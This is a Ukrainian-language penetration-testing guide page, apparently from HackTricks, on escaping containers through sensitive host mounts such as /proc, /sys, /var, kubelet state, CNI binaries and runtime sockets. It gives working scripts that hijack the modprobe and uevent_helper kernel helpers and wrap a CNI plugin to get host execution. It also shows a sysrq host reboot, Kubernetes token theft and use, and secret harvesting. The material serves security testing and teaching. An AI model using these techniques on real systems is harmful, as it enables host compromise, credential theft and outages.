# Чутливі монтування хоста

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Монтування хоста — одна з найважливіших практичних поверхонь для виходу з контейнера, оскільки вони часто зводять нанівець ретельно ізольоване представлення процесу, надаючи прямий доступ до ресурсів хоста. Небезпечні випадки не обмежуються `/`. Bind mounts для `/proc`, `/sys`, `/var`, сокетів runtime, стану під керуванням kubelet або шляхів, пов’язаних із пристроями, можуть відкривати доступ до засобів керування ядром, облікових даних, файлових систем сусідніх контейнерів і інтерфейсів керування runtime.

Цю сторінку винесено окремо від сторінок про конкретні механізми захисту, оскільки модель зловживання охоплює кілька аспектів. Монтування хоста з правом запису небезпечне частково через mount namespaces, частково через user namespaces, частково через охоплення AppArmor або SELinux, а частково через те, який саме шлях хоста відкрито. Розгляд цього питання як окремої теми значно спрощує аналіз поверхні атаки.

Також порівняйте каталог хоста, доступний для запису, з відповідним шляхом усередині кожного контейнера. Якщо його змонтовано поверх каталогу з виконуваними startup-скриптами, користувач хоста з нижчими привілеями може розмістити код, який entrypoint контейнера з вищими привілеями завантажить під час наступного перезапуску. Перевірте точні джерело й ціль bind mount, права на запис і пошук у каталозі, цикл entrypoint і вимогу до виконуваного файла, UID runtime та реальний тригер перезапуску. UID 0 контейнера не означає автоматично UID 0 хоста; вплив на хост визначають зіставлення user namespace і політика монтування. Під час пасивного аналізу слід повідомляти шляхи та дозволи, не записуючи скрипт і не перезапускаючи workload.

Контейнер Linux може працювати всередині VM керування, яка спільно використовує частину файлової системи окремого хоста Windows. [Спільні папки VirtualBox](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) — один зі способів зробити файли хоста доступними в гостьовій системі, але root у цій VM усе одно є окремою ідентичністю від адміністратора Windows. Якщо спільна папка відкриває для читання приватний SSH-ключ користувача, розглядайте його як потенційний обліковий ресурс: перевірте точне монтування з боку хоста, власника ключа та права доступу до нього, відповідний обліковий запис і **ефективну** політику authorized keys SSH-сервера Windows, перш ніж робити висновок, що ключ дає змогу ввійти на хост. У сучасному [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) для облікових записів адміністраторів зазвичай використовується окремий файл `administrators_authorized_keys`. Не включайте вміст приватного ключа до звичайного виводу під час переліку даних; для пасивного сортування достатньо метаданих монтування та шляху до ключа.

## Відкритий доступ до `/proc`

procfs містить як звичайну інформацію про процеси, так і важливі інтерфейси керування ядром. Тому bind mount на кшталт `-v /proc:/host/proc` або представлення контейнера, що відкриває несподівані записи proc із правом запису, може призвести до розкриття інформації, відмови в обслуговуванні або безпосереднього виконання коду на хості.

До важливих шляхів procfs належать:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (особливо `register` і `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Зловживання

Спершу перевірте, які важливі записи procfs доступні або відкриті для запису:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

Ці шляхи цікаві з різних причин. Якщо `core_pattern`, `modprobe` і `binfmt_misc` доступні для запису, вони можуть стати шляхами до виконання коду на хості. `kallsyms`, `kmsg`, `kcore` і `config.gz` — потужні джерела даних для розвідки під час експлуатації ядра. `sched_debug` і `mountinfo` розкривають контекст процесів, cgroup і файлової системи, що може допомогти відновити структуру хоста зсередини контейнера.

Практична цінність кожного шляху різна, і якщо вважати, що всі вони мають однаковий вплив, це ускладнює сортування знахідок:

- `/proc/sys/kernel/core_pattern`
  Якщо цей шлях доступний для запису, це один із найнебезпечніших шляхів у procfs, оскільки після аварійного завершення процесу ядро виконає обробник, указаний через pipe. Контейнер, який може вказати в `core_pattern` на payload, що зберігається в його overlay або в змонтованому шляху хоста, часто може отримати виконання коду на хості. Див. також [read-only-paths.md](protections/read-only-paths.md) для окремого прикладу.
- `/proc/sys/kernel/modprobe`
  Цей шлях керує допоміжною програмою userspace, яку використовує ядро, коли йому потрібно запустити логіку завантаження модулів. Якщо він доступний для запису з контейнера й інтерпретується в контексті хоста, то може стати ще одним примітивом для виконання коду на хості. Особливо цікавий у поєднанні зі способом викликати цей допоміжний шлях.
- `/proc/sys/vm/panic_on_oom`
  Зазвичай це не прямий примітив для виходу з контейнера, але він може перетворити нестачу пам’яті на відмову в обслуговуванні всього хоста, перетворюючи ситуації OOM на паніку ядра.
- `/proc/sys/fs/binfmt_misc`
  Якщо інтерфейс реєстрації доступний для запису, зловмисник може зареєструвати обробник для вибраного magic value і отримати виконання в контексті хоста, коли буде запущено відповідний файл.
- `/proc/config.gz`
  Корисний для сортування знахідок під час аналізу експлойтів ядра. Допомагає визначити, які підсистеми, механізми захисту й додаткові можливості ядра ввімкнено, без потреби в метаданих пакетів хоста.
- `/proc/sysrq-trigger`
  Переважно шлях до відмови в обслуговуванні, але дуже серйозний. Він може негайно перезавантажити хост, викликати паніку ядра або спричинити інше порушення його роботи.
- `/proc/kmsg`
  Розкриває повідомлення з кільцевого буфера ядра. Корисний для fingerprinting хоста, аналізу аварій і, у деяких середовищах, для витоку інформації, що допомагає в експлуатації ядра.
- `/proc/kallsyms`
  Цінний, якщо доступний для читання, оскільки розкриває інформацію про експортовані символи ядра й може допомогти обійти припущення щодо рандомізації адрес під час розробки експлойтів ядра.
- `/proc/[pid]/mem`
  Це прямий інтерфейс до пам’яті процесу. Якщо цільовий процес доступний за необхідних умов на кшталт ptrace, цей інтерфейс може дозволити читати або змінювати пам’ять іншого процесу. Реальний вплив значною мірою залежить від облікових даних, `hidepid`, Yama та обмежень ptrace, тому це потужний, але умовний шлях.
- `/proc/kcore`
  Надає представлення пам’яті системи у форматі core image. Файл величезний і незручний у використанні, але якщо його можна повноцінно читати, це свідчить про небезпечне відкриття поверхні пам’яті хоста.
- `/dev/kmem` і `/dev/mem`
  Історично це інтерфейси **пристроїв** для прямого доступу до пам’яті з високим рівнем впливу, а не файли procfs. У багатьох сучасних системах їх немає або доступ до них суворо обмежено, але контейнер, який може відкрити змонтовану копію з хоста, має вважати такий доступ критичним. Перевіряйте їх разом з іншими чутливими монтуваннями `/dev`, а не шукайте неіснуючі шляхи `/proc/kmem` або `/proc/mem`.
- `/proc/sched_debug`
  Витік даних про планування та завдання може розкрити ідентифікатори процесів хоста, навіть якщо інші представлення процесів виглядають чистішими, ніж очікувалося.
- `/proc/[pid]/mountinfo`
  Надзвичайно корисний для відновлення фактичного розташування контейнера на хості, визначення шляхів, розміщених в overlay, і з’ясування, чи відповідає монтування з доступом для запису вмісту хоста, чи лише шару контейнера.

Якщо `/proc/[pid]/mountinfo` або відомості про overlay доступні для читання, використовуйте їх, щоб визначити шлях файлової системи контейнера на хості:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

Ці команди корисні, оскільки для низки трюків виконання команд на хості потрібно перетворити шлях усередині контейнера на відповідний шлях із погляду хоста.

### Приклад: підготовка шляху до помічника `modprobe`

Якщо з контейнера доступний для запису `/proc/sys/kernel/modprobe`, а шлях до помічника обробляється в контексті хоста, його можна перенаправити на контрольований зловмисником payload. Верхній каталог overlay має визначатися з боку хоста, а доказ виконання потрібно записати назад у той самий видимий хосту шар контейнера, якщо контейнер не монтує також хостовий `/tmp`:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

Точний тригер залежить від цілі та поведінки ядра, тому його навмисно не вгадують. Відновіть початкове значення, перш ніж залишити лабораторне середовище. Важливо те, що доступний для запису шлях до helper може перенаправити майбутній виклик helper ядром на вміст host-шляху, контрольований атакувальником. Відсутній `upperdir` в overlay, шлях, який хост не може розв’язати, sysctl-монтування лише для читання або ядро, яке ніколи не викликає вибраний helper, розривають цей ланцюжок.

### Повний приклад: Kernel Recon із `kallsyms`, `kmsg` та `config.gz`

Якщо мета — оцінити можливість експлуатації, а не негайно виконати escape:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

Ці команди допомагають з’ясувати, чи доступна корисна інформація про символи, чи розкривають останні повідомлення ядра цікавий стан і які функції ядра або засоби пом’якшення скомпільовано. Зазвичай це не призводить до прямого escape, але може значно пришвидшити аналіз вразливостей ядра.

### Повний приклад: перезавантаження хоста через SysRq

Якщо `/proc/sysrq-trigger` доступний для запису й веде до подання хоста:

```bash
echo b > /proc/sysrq-trigger
```

Ефект — негайне перезавантаження хоста. Це не непомітний приклад, але він чітко демонструє, що доступ до procfs може мати набагато серйозніші наслідки, ніж розкриття інформації.

## Відкритий доступ до `/sys`

sysfs відкриває доступ до значних обсягів даних про стан ядра та пристроїв. Деякі шляхи sysfs переважно корисні для fingerprinting, тоді як інші можуть впливати на запуск допоміжних програм, поведінку пристроїв, конфігурацію модулів безпеки або стан firmware.

До шляхів sysfs, що мають високу цінність, належать:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ці шляхи важливі з різних причин. `/sys/class/thermal` може впливати на поведінку керування температурою, а отже, і на стабільність хоста в середовищах із неналежно налаштованим доступом. `/sys/kernel/vmcoreinfo` може розкривати відомості про дампи аварійного завершення роботи та компонування ядра, що допомагає виконувати низькорівневий fingerprinting хоста. `/sys/kernel/security` — це інтерфейс `securityfs`, який використовують Linux Security Modules, тож неочікуваний доступ до нього може розкрити або змінити стан, пов’язаний із MAC. Шляхи змінних EFI можуть впливати на параметри завантаження, що зберігаються у firmware, і робить їх набагато небезпечнішими за звичайні файли конфігурації. `debugfs` у `/sys/kernel/debug` особливо небезпечний, оскільки це інтерфейс, призначений для розробників, до якого висувають значно менше вимог безпеки, ніж до загальнодоступних API ядра, посилених для production-середовищ.

Кожен запис sysfs у цьому списку **залежить від ядра, конфігурації та обладнання**. У сучасних віртуалізованих вузлах часто взагалі немає `uevent_helper`, змінних EFI та записів термальних пристроїв. Фіксуйте відсутній шлях як негативну передумову, а не припускайте, що приклад з іншого ядра тут застосовний.

Корисні команди для перевірки цих шляхів:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

Що робить ці команди цікавими:

- `/sys/kernel/security` може показати, чи доступний інтерфейс AppArmor, SELinux або іншого LSM там, де він мав бути видимим лише з хоста.
- `/sys/kernel/debug` часто є найтривожнішою знахідкою в цій групі. Якщо `debugfs` змонтовано та доступно для читання або запису, очікуйте широку поверхню взаємодії з ядром, точний ризик якої залежить від увімкнених вузлів налагодження.
- Доступ до змінних EFI трапляється рідше, але має високий вплив, оскільки стосується налаштувань, що зберігаються у прошивці, а не звичайних файлів середовища виконання.
- `/sys/class/thermal` важливий переважно для стабільності хоста та взаємодії з обладнанням, а не для простого виходу з контейнера через shell.
- `/sys/kernel/vmcoreinfo` є насамперед джерелом даних для ідентифікації хоста й аналізу збоїв, корисним для розуміння низькорівневого стану ядра.

### Повний приклад: `uevent_helper`

`/sys/kernel/uevent_helper` залежить від ядра та конфігурації й відсутній у багатьох сучасних системах. Якщо він існує, доступний для запису, а також доступний придатний тригер `uevent`, ядро може виконати контрольований зловмисником допоміжний файл. Для підтвердження слід використовувати шлях, видимий і з хоста, і з контейнера:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

Причина, чому це працює, полягає в тому, що шлях до helper інтерпретується з погляду хоста. Після запуску helper виконується в контексті хоста, а не всередині поточного контейнера. `/sys/class/mem/null/uevent` — один конкретний тригер у ядрах, де він доступний; інші пристрої можуть мати власні файли `uevent`, але не вибирайте їх навмання на реальному обладнанні. Відновіть початкове значення перед виходом із лабораторного середовища. Не повідомляйте про доступність цієї техніки, якщо файл helper або контрольований тригер відсутні.

## Доступ до `/var`

Монтування `/var` хоста в контейнер часто недооцінюють, бо це не виглядає так разюче, як монтування `/`. На практиці цього може вистачити, щоб отримати доступ до сокетів runtime, каталогів snapshot контейнерів, томів pod, якими керує kubelet, змонтованих токенів service account та файлових систем сусідніх застосунків. На сучасних вузлах саме в `/var` часто розміщується найцікавіший з операційного погляду стан контейнерів.

### Приклад Kubernetes

Pod із `hostPath: /var` часто може читати змонтовані токени інших pod і вміст overlay snapshot:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

Ці команди корисні, оскільки допомагають з’ясувати, чи монтування відкриває доступ лише до звичайних даних застосунку, чи до критично важливих облікових даних кластера. Доступний для читання токен service account може одразу перетворити локальне виконання коду на доступ до Kubernetes API.

Якщо токен присутній, перевірте, до чого він дає доступ, замість того щоб зупинятися на його виявленні:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

Вплив тут може бути значно масштабнішим, ніж доступ до локального вузла. Токен із широкими правами RBAC може перетворити змонтований `/var` на компрометацію всього кластера.

### Приклад із Docker і containerd

На хостах Docker відповідні дані часто розташовані в `/var/lib/docker`, а на вузлах Kubernetes із containerd — у `/var/lib/containerd` або у специфічних для snapshotter шляхах:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

Якщо змонтований `/var` відкриває доступ до вмісту знімка іншого workload із правами на запис, зловмисник може змінити файли застосунку, розмістити вебвміст або змінити скрипти запуску, не торкаючись конфігурації поточного контейнера.

На **одноразовому лабораторному workload** вміст знімка з правами на запис може продемонструвати втручання в застосунок, відновлення секретів або lateral movement. Спершу зіставте runtime container ID із точним знімком і ніколи не редагуйте сторонній або production-знімок:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

Ці команди корисні, бо показують три основні категорії впливу від змонтованого `/var`: втручання в застосунки, отримання секретів і lateral movement до сусідніх workloads.

Прямий запис у snapshot обходить звичайне керування станом runtime і може пошкодити контейнер або знищити докази. Read-only виявлення було локально відтворено на Docker `overlay2`: маркер, записаний у сусідньому тимчасовому контейнері, з’явився в ` /var/lib/docker/overlay2/<id>/diff/`. Фактичну модифікацію snapshot обмежте тимчасовим контейнером, створеним для цього тесту.

## Стан Kubelet, плагіни та шляхи CNI

Монтований `/var/lib/kubelet`, `/opt/cni/bin` або `/etc/cni/net.d` часто доступний через привілейовані DaemonSets, агенти CNI, плагіни вузлів CSI, оператори GPU та допоміжні засоби сховищ. Такі монтування легко списати на «інфраструктуру вузла», але вони розташовані безпосередньо на шляху виконання нових pod і часто містять облікові дані kubelet, спроєктовані секрети, сокети реєстрації та виконувані бінарні файли плагінів на хості.

До цілей високої цінності належать:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Корисні команди для перевірки:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

Чому ці шляхи важливі:

- `/var/lib/kubelet/pki` може відкривати доступ до клієнтських сертифікатів kubelet та інших облікових даних, локальних для вузла, які іноді можна повторно використати для доступу до API server або TLS-ендпойнтів kubelet — залежно від конфігурації кластера.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` часто містить токени service account і змонтовані Secrets сусідніх подів на тому самому вузлі.
- `/var/lib/kubelet/pod-resources/kubelet.sock` — це переважно поверхня для розвідки, але дуже корисна: вона показує, які поди й контейнери наразі використовують GPU, hugepages, пристрої SR-IOV та інші дефіцитні ресурси вузла.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` і `/var/lib/kubelet/plugins_registry` показують, які плагіни CSI, DRA та пристроїв встановлено, а також з якими сокетами має взаємодіяти kubelet. Якщо ці каталоги доступні для запису, а не лише для читання, знахідка стає значно серйознішою.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` і `/etc/cni/net.d` безпосередньо задіяні в налаштуванні мережі подів. Доступ для запису до них часто дає змогу відкласти виконання коду на хості, а не просто переглянути конфігурацію.<sup>[[2]](#references)</sup>

### Повний приклад: доступний для запису `/opt/cni/bin`

Якщо каталог бінарних файлів CNI хоста змонтовано з доступом для читання й запису, для отримання можливості виконувати код на хості може бути достатньо замінити плагін — під час наступного створення kubelet пісочниці пода на цьому вузлі:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

Це не так безпосередньо, як змонтований `docker.sock`, але в скомпрометованих інфраструктурних Pod’ах Kubernetes таке трапляється частіше. Маркер записується поруч зі змонтованим плагіном, щоб контейнер міг його отримати навіть без монтування host-root або host-`/tmp`. Обгортка зберігає початкові аргументи та стандартний ввід, після чого приклад відновлює початковий бінарний файл. Важливо те, що змінений бінарний файл згодом запускається процесом налаштування мережі хоста, а не поточним контейнером. Використовуйте лише вузол, призначений для тестування, оскільки некоректна обгортка може позбавити нові Pod sandbox’и мережевого підключення.

## Сокети середовища виконання

До чутливих монтувань хоста часто належать сокети середовища виконання, а не цілі каталоги. Вони настільки важливі, що про них варто нагадати окремо:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

Перегляньте [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md), щоб ознайомитися з повними сценаріями експлуатації після монтування одного з цих сокетів.

Як швидкий шаблон першої взаємодії:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

Якщо один із цих способів спрацьовує, шлях від «змонтованого сокета» до «запуску привілейованішого sibling-контейнера» зазвичай набагато коротший, ніж будь-який шлях до виходу за межі ядра.

Цей самий доступ до демона також може забезпечити **закріплення на хості**. Допоміжний контейнер із доступним для запису bind mount кореневого каталогу хоста може отримати файли через `docker cp`, а потім використати `docker exec`, щоб розмістити SSH-ключ, unit служби або інший файл для закріплення за змонтованим шляхом хоста. Межу безпеки визначають повноваження демона створювати монтування хоста; `docker cp` — лише проміжний крок. Після відкриття доступу до сокета середовища виконання перевіряйте як новостворені контейнери, так і записи до шляхів автентифікації або запуску на хості.

## Перехоплення завдання через доступний для запису шлях хоста

Змонтований шлях хоста не обов’язково має відкривати `/`, щоб бути небезпечним. Якщо цей шлях містить скрипти, конфігураційні файли, хуки, плагіни або файли, які згодом використовує заплановане завдання чи служба на хості, контейнер може змінити те, що запускатиме хост.

Загальний порядок перевірки:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

Якщо процес на хості обробляє файл, доступний для запису, під час тестування залишайте payload простим і помітним:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

Цікавий тут саме кордон довіри: запис виконується зсередини контейнера, але виконання відбувається пізніше в контексті host-сервісу. Так вузький hostPath або bind mount перетворюється на примітив відкладеного виконання коду на host.

## Файли, що належать root, на спільному шляху host

Обліковий запис контейнера, який може отримати права root, може мати змогу розмістити файл, що належить root, на шляху для запису, який також використовує host. Якщо UID 0 контейнера зіставляється з UID 0 host, обидва представлення вказують на той самий файл, а монтування host дозволяє виконання SUID, користувач host, який може запускати root-owned виконуваний файл SUID за цим шляхом, може перетнути межу привілеїв host. Для цієї конкретної проблеми з власником файлу контейнеру не обов’язково запускатися з `--privileged`. Див. [зіставлення user namespace](protections/namespaces/user-namespace.md) і окремий розгляд [SUID](privileged-containers.md), щоб дізнатися про інші необхідні умови.

Перевіряйте шлях **з обох боків**: порівняйте власника й ідентифікатор нешкідливого файлу, перевірте `uid_map` і `gid_map` контейнера та параметри монтування й політику виконання на host. `rw` з боку контейнера без `nosuid` лише вказує на можливого кандидата; цього недостатньо, щоб підтвердити власника на host, прапорці монтування host, доступ користувача host або те, чи блокує виконання AppArmor/SELinux. `noexec` обмежує виконання у тому представленні, де цей параметр діє. Теги `shared:` і `master:` у `/proc/self/mountinfo` описують поширення монтування, а не те, чи є вміст файлу спільним із host. У bind mount таких тегів може не бути. Повторне використання облікових даних для входу на host — це окремий крок, не пов’язаний із межею привілеїв спільного файлу.

Сховище runtime на host може створити подібний шлях навіть без явного bind mount. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) дозволяла непривілейованому користувачеві host проходити через підкаталоги даних Docker і виконувати файли з файлової системи контейнера; Moby виправила дозволи у версії 20.10.9 і зазначає, що для виправлення каталогів запущені контейнери потрібно перезапустити. Перевірте точні шляхи змонтованих `overlay2/<id>/merged` і дозволи пошуку в кожному батьківському каталозі, а потім з’ясуйте, чи зіставляється UID 0 контейнера з UID 0 host, чи наявний і доступний справжній виконуваний файл SetUID, що належить root, і чи дозволяє представлення host виконання SetUID. Rootless-контейнери, контейнери з user-namespace remapping, `nosuid`, `noexec`, `no_new_privs` і політика MAC можуть змінити результат. Версія runtime або доступний для проходу шлях — це лише привід для перевірки, а не доказ виконання коду з правами root на host; перевіряйте метадані монтування й файлів, не запускаючи потенційно небезпечний виконуваний файл.

## CVE, пов’язані з монтуванням

Монтування на host також пов’язані з вразливостями runtime. Важливі нещодавні приклади:

- `CVE-2024-21626` у `runc`, де витік дескриптора файлу каталогу міг призвести до розміщення робочого каталогу у файловій системі host.
- `CVE-2024-23651`, `CVE-2024-23652` і `CVE-2024-23653` у BuildKit, де шкідливі Dockerfile, frontends і потоки `RUN --mount` могли знову відкрити доступ до файлів host, їх видалення або підвищення привілеїв під час збірок.
- `CVE-2024-1753` у потоках збірки Buildah і Podman, де спеціально сформовані bind mounts під час збірки могли відкрити `/` для читання й запису.
- `CVE-2025-47290` у `containerd` 2.1.0, де TOCTOU під час розпакування образу могла дозволити спеціально сформованому образу змінювати файлову систему host під час завантаження.

Ці CVE важливі тут, бо демонструють, що проблеми з обробкою монтувань зумовлені не лише конфігурацією оператора. Сам runtime також може створювати умови для escape через монтування.

## Перевірки

Використовуйте ці команди, щоб швидко знайти найризикованіші доступи до монтувань:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

Що тут цікаво:

- Host root, `/proc`, `/sys`, `/var` і runtime sockets — це знахідки найвищого пріоритету.
- Доступні для запису записи proc/sys часто означають, що mount відкриває глобальні для host елементи керування ядром, а не безпечне представлення контейнера.
- Шляхи змонтованого `/var` потребують перевірки облікових даних і сусідніх робочих навантажень, а не лише файлової системи.
- Каталоги стану Kubelet і шляхи CNI/plugin заслуговують на такий самий пріоритет, як runtime sockets, бо часто лежать безпосередньо на шляху створення pod і розповсюдження облікових даних на вузлі.

## Статус локальної перевірки

Практичні ланцюжки на цій сторінці перевірено на локальному вузлі Linux minikube. Під час перевірки відтворено:

- доступ на читання й запис через тимчасовий доступний для запису hostPath
- виявлення токенів ServiceAccount і змонтованих Secrets через `/var/lib/kubelet/pods`
- успішну автентифікацію в Kubernetes API за допомогою дійсного токена, отриманого зі змонтованого стану kubelet
- виявлення файлової системи Docker `overlay2` сусіднього контейнера лише для читання через змонтований `/var`
- створення Docker API сусіднього контейнера з прив’язкою host лише для читання через змонтований `docker.sock`
- відкладене виконання на host через тимчасовий hook, який обробляє host
- симуляцію CNI-wrapper, що зберегла аргументи, стандартний ввід і виконання оригінального plugin

На тому самому вузлі були доступні `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` і `config.gz`, але не були доступні `uevent_helper`, змінні EFI, записи thermal або `sched_debug`. Деструктивні тригери ядра не запускалися. Це підтверджує, що ланцюжки з host-root, `/var`, станом kubelet, сокетами й обробниками на host можна відтворити, тоді як методи з помічниками procfs/sysfs залежать від конкретної версії ядра, режиму монтування, шляху payload і тригера.
